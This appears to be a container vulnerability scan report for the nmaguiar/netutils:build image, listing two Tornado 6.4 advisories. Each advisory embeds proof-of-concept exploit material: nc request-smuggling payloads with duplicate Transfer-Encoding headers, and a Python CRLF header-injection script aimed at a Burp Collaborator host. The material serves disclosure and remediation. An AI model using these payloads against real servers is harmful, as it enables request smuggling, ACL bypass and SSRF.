````yaml
╭ [0] ╭ Target: nmaguiar/netutils:build (alpine 3.20.2) 
│     ├ Class : os-pkgs 
│     ╰ Type  : alpine 
├ [1] ╭ Target: Java 
│     ├ Class : lang-pkgs 
│     ╰ Type  : jar 
╰ [2] ╭ Target         : Python 
      ├ Class          : lang-pkgs 
      ├ Type           : python-pkg 
      ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GHSA-753j-mpmx-qq6g 
                        │     ├ PkgName         : tornado 
                        │     ├ PkgPath         : opt/mitmproxy/lib/python3.12/site-packages/tornado-6.4.dist-i
                        │     │                   nfo/METADATA 
                        │     ├ PkgIdentifier    ╭ PURL: pkg:pypi/tornado@6.4 
                        │     │                  ╰ UID : b090c7087740b931 
                        │     ├ InstalledVersion: 6.4 
                        │     ├ FixedVersion    : 6.4.1 
                        │     ├ Status          : fixed 
                        │     ├ Layer            ╭ Digest: sha256:bf4dbd93c976e9854d14c99494a23d7e04b2577d6bad2
                        │     │                  │         1ed73c94ca48eb1c921 
                        │     │                  ╰ DiffID: sha256:488b1f986bdaaf44b4241d45481f5b3f5cc9ca20da7ed
                        │     │                            73f0769d43f9c6b2f76 
                        │     ├ SeveritySource  : ghsa 
                        │     ├ PrimaryURL      : https://github.com/advisories/GHSA-753j-mpmx-qq6g 
                        │     ├ DataSource       ╭ ID  : ghsa 
                        │     │                  ├ Name: GitHub Security Advisory pip 
                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
                        │     │                          osystem%3Apip 
                        │     ├ Title           : Inconsistent Interpretation of HTTP Requests ('HTTP
                        │     │                   Request/Response Smuggling') in tornado 
                        │     ├ Description     : ### Summary
                        │     │                   When Tornado receives a request with two `Transfer-Encoding:
                        │     │                   chunked` headers, it ignores them both. This enables request
                        │     │                   smuggling when Tornado is deployed behind a proxy server that
                        │     │                    emits such requests.
                        │     │                   [Pound](https://en.wikipedia.org/wiki/Pound_(networking))
                        │     │                   does this.
                        │     │                   
                        │     │                   ### PoC
                        │     │                   0. Install Tornado.
                        │     │                   1. Start a simple Tornado server that echoes each received
                        │     │                   request's body:
                        │     │                   ```bash
                        │     │                   cat << EOF > server.py
                        │     │                   import asyncio
                        │     │                   import tornado
                        │     │                   
                        │     │                   class MainHandler(tornado.web.RequestHandler):
                        │     │                       def post(self):
                        │     │                           self.write(self.request.body)
                        │     │                   
                        │     │                   async def main():
                        │     │                       tornado.web.Application([(r"/",
                        │     │                   MainHandler)]).listen(8000)
                        │     │                       await asyncio.Event().wait()
                        │     │                   
                        │     │                   asyncio.run(main())
                        │     │                   EOF
                        │     │                   python3 server.py &
                        │     │                   ```
                        │     │                   2. Send a valid chunked request:
                        │     │                   ```bash
                        │     │                   printf 'POST / HTTP/1.1\r\nTransfer-Encoding:
                        │     │                   chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
                        │     │                   ```
                        │     │                   3. Observe that the response is as expected:
                        │     │                   ```
                        │     │                   HTTP/1.1 200 OK
                        │     │                   Server: TornadoServer/6.3.3
                        │     │                   Content-Type: text/html; charset=UTF-8
                        │     │                   Date: Sat, 07 Oct 2023 17:32:05 GMT
                        │     │                   Content-Length: 1
                        │     │                   
                        │     │                   Z
                        │     │                   ```
                        │     │                   4. Send a request with two `Transfer-Encoding: chunked`
                        │     │                   headers:
                        │     │                   ```
                        │     │                   printf 'POST / HTTP/1.1\r\nTransfer-Encoding:
                        │     │                   chunked\r\nTransfer-Encoding:
                        │     │                   chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
                        │     │                   ```
                        │     │                   5. Observe the strange response:
                        │     │                   ```
                        │     │                   HTTP/1.1 200 OK
                        │     │                   Server: TornadoServer/6.3.3
                        │     │                   Content-Type: text/html; charset=UTF-8
                        │     │                   Date: Sat, 07 Oct 2023 17:35:40 GMT
                        │     │                   Content-Length: 0
                        │     │                   
                        │     │                   HTTP/1.1 400 Bad Request
                        │     │                   
                        │     │                   ```
                        │     │                   This is because Tornado believes that the request has no
                        │     │                   message body, so it tries to interpret `1\r\nZ\r\n0\r\n\r\n`
                        │     │                   as its own request, which causes a 400 response. With a
                        │     │                   little cleverness involving `chunk-ext`s, you can get Tornado
                        │     │                    to instead respond 405, which has the potential to
                        │     │                   desynchronize the connection, as opposed to 400 which should
                        │     │                   always result in a connection closure.
                        │     │                   
                        │     │                   ### Impact
                        │     │                   Anyone using Tornado behind a proxy that forwards requests
                        │     │                   containing multiple `Transfer-Encoding: chunked` headers is
                        │     │                   vulnerable to request smuggling, which may entail ACL bypass,
                        │     │                    cache poisoning, or connection desynchronization. 
                        │     ├ Severity        : MEDIUM 
                        │     ├ VendorSeverity   ─ ghsa: 2 
                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
                        │     │                         ╰ V3Score : 5.3 
                        │     ╰ References       ╭ [0]: https://github.com/tornadoweb/tornado 
                        │                        ├ [1]: https://github.com/tornadoweb/tornado/commit/d65f6e71a7
                        │                        │      7f53a1ff0a0dc55704be13f04eb572 
                        │                        ╰ [2]: https://github.com/tornadoweb/tornado/security/advisori
                        │                               es/GHSA-753j-mpmx-qq6g 
                        ╰ [1] ╭ VulnerabilityID : GHSA-w235-7p84-xx57 
                              ├ PkgName         : tornado 
                              ├ PkgPath         : opt/mitmproxy/lib/python3.12/site-packages/tornado-6.4.dist-i
                              │                   nfo/METADATA 
                              ├ PkgIdentifier    ╭ PURL: pkg:pypi/tornado@6.4 
                              │                  ╰ UID : b090c7087740b931 
                              ├ InstalledVersion: 6.4 
                              ├ FixedVersion    : 6.4.1 
                              ├ Status          : fixed 
                              ├ Layer            ╭ Digest: sha256:bf4dbd93c976e9854d14c99494a23d7e04b2577d6bad2
                              │                  │         1ed73c94ca48eb1c921 
                              │                  ╰ DiffID: sha256:488b1f986bdaaf44b4241d45481f5b3f5cc9ca20da7ed
                              │                            73f0769d43f9c6b2f76 
                              ├ SeveritySource  : ghsa 
                              ├ PrimaryURL      : https://github.com/advisories/GHSA-w235-7p84-xx57 
                              ├ DataSource       ╭ ID  : ghsa 
                              │                  ├ Name: GitHub Security Advisory pip 
                              │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
                              │                          osystem%3Apip 
                              ├ Title           : Tornado has a CRLF injection in CurlAsyncHTTPClient headers 
                              ├ Description     : ### Summary
                              │                   Tornado’s `curl_httpclient.CurlAsyncHTTPClient` class is
                              │                   vulnerable to CRLF (carriage return/line feed) injection in
                              │                   the request headers.
                              │                   
                              │                   ### Details
                              │                   When an HTTP request is sent using `CurlAsyncHTTPClient`,
                              │                   Tornado does not reject carriage return (\r) or line feed
                              │                   (\n) characters in the request headers. As a result, if an
                              │                   application includes an attacker-controlled header value in a
                              │                    request sent using `CurlAsyncHTTPClient`, the attacker can
                              │                   inject arbitrary headers into the request or cause the
                              │                   application to send arbitrary requests to the specified
                              │                   server.
                              │                   
                              │                   This behavior differs from that of the standard
                              │                   `AsyncHTTPClient` class, which does reject CRLF characters.
                              │                   
                              │                   This issue appears to stem from libcurl's (as well as
                              │                   pycurl's) lack of validation for the
                              │                   [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.h
                              │                   tml) option. libcurl’s documentation states:
                              │                   
                              │                   > The headers included in the linked list must not be
                              │                   CRLF-terminated, because libcurl adds CRLF after each header
                              │                   item itself. Failure to comply with this might result in
                              │                   strange behavior. libcurl passes on the verbatim strings you
                              │                   give it, without any filter or other safe guards. That
                              │                   includes white space and control characters.
                              │                   
                              │                   pycurl similarly appears to assume that the headers adhere to
                              │                    the correct format. Therefore, without any validation on
                              │                   Tornado’s part, header names and values are included verbatim
                              │                    in the request sent by `CurlAsyncHTTPClient`, including any
                              │                   control characters that have special meaning in HTTP
                              │                   semantics.
                              │                   
                              │                   ### PoC
                              │                   The issue can be reproduced using the following script:
                              │                   
                              │                   ```python
                              │                   import asyncio
                              │                   
                              │                   from tornado import httpclient
                              │                   from tornado import curl_httpclient
                              │                   
                              │                   async def main():
                              │                       http_client = curl_httpclient.CurlAsyncHTTPClient()
                              │                   
                              │                       request = httpclient.HTTPRequest(
                              │                           # Burp Collaborator payload
                              │                          
                              │                   "http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/",
                              │                           method="POST",
                              │                           body="body",
                              │                           # Injected header using CRLF characters
                              │                           headers={"Foo": "Bar\r\nHeader: Injected"}
                              │                       )
                              │                   
                              │                       response = await http_client.fetch(request)
                              │                       print(response.body)
                              │                   
                              │                       http_client.close()
                              │                   
                              │                   if __name__ == "__main__":
                              │                       asyncio.run(main())
                              │                   ```
                              │                   
                              │                   When the specified server receives the request, it contains
                              │                   the injected header (`Header: Injected`) on its own line:
                              │                   
                              │                   ```http
                              │                   POST / HTTP/1.1
                              │                   Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
                              │                   User-Agent: Mozilla/5.0 (compatible; pycurl)
                              │                   Accept: */*
                              │                   Accept-Encoding: gzip,deflate
                              │                   Foo: Bar
                              │                   Header: Injected
                              │                   Content-Length: 4
                              │                   Content-Type: application/x-www-form-urlencoded
                              │                   
                              │                   body
                              │                   ```
                              │                   
                              │                   The attacker can also construct entirely new requests using a
                              │                    payload with multiple CRLF sequences. For example,
                              │                   specifying a header value of `\r\n\r\nPOST
                              │                   /attacker-controlled-url HTTP/1.1\r\nHost:
                              │                   727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the
                              │                    server receiving an additional, attacker-controlled
                              │                   request:
                              │                   
                              │                   ```http
                              │                   POST /attacker-controlled-url HTTP/1.1
                              │                   Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
                              │                   Content-Length: 4
                              │                   Content-Type: application/x-www-form-urlencoded
                              │                   
                              │                   body
                              │                   ```
                              │                   
                              │                   ### Impact
                              │                   Applications using the Tornado library to send HTTP requests
                              │                   with untrusted header data are affected. This issue may
                              │                   facilitate the exploitation of server-side request forgery
                              │                   (SSRF) vulnerabilities. 
                              ├ Severity        : MEDIUM 
                              ├ VendorSeverity   ─ ghsa: 2 
                              ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
                              │                         ╰ V3Score : 6.5 
                              ╰ References       ╭ [0]: https://github.com/tornadoweb/tornado 
                                                 ├ [1]: https://github.com/tornadoweb/tornado/commit/7786f09f84
                                                 │      c9f3f2012c4cf3878417cb9f053669 
                                                 ╰ [2]: https://github.com/tornadoweb/tornado/security/advisori
                                                        es/GHSA-w235-7p84-xx57 
````
